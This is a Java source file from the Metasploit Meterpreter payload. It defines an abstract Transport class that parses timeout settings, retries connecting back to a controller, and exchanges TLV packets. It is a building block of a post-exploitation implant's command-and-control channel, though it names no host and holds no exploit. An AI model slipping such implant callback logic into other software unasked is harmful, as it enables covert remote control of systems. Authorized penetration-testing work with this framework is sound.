package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.OutputStream;
import java.io.IOException;

public abstract class Transport {
    private Transport prev;
    private Transport next;

    protected String url;
    protected long commTimeout;
    protected long retryTotal;
    protected long retryWait;

    protected abstract boolean tryConnect(Meterpreter met) throws IOException;

    public abstract int parseConfig(byte[] configuration, int offset);
    public abstract void bind(DataInputStream in, OutputStream rawOut);
    public abstract void disconnect();
    public abstract boolean dispatch(Meterpreter met, CommandManager commandManager);
    public abstract void writePacket(TLVPacket packet, int type) throws IOException;
    public abstract TLVPacket readPacket() throws IOException;

    protected Transport(String url) {
        this.url = url;
    }

    protected int parseTimeouts(byte[] configuration, int offset) {
        // starts with the comms timeout
        this.commTimeout = 1000L * Meterpreter.unpack32(configuration, offset);
        System.out.println("msf : Comm timeout ms: " + this.commTimeout);
        offset += 4;

        // then we have the retry total
        this.retryTotal = 1000L * Meterpreter.unpack32(configuration, offset);
        System.out.println("msf : Retry total ms: " + this.retryTotal);
        offset += 4;

        // then we have the retry wait
        this.retryWait = 1000L * Meterpreter.unpack32(configuration, offset);
        System.out.println("msf : Retry Wait ms: " + this.retryWait);
        offset += 4;

        return offset;
    }

    public boolean connect(Meterpreter met) {
        long lastAttempt = System.currentTimeMillis();

        while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
            try {
                if (this.tryConnect(met)) {
                    return true;
                }
            } catch (Exception e) {
            }

            met.sleep(this.retryWait);
        }

        return false;
    }

    public void setPrev(Transport t) {
        this.prev = t;
    }

    public void setNext(Transport t) {
        this.next = t;
    }

    public Transport getPrev() {
        return this.prev;
    }

    public Transport getNext() {
        return this.next;
    }
}

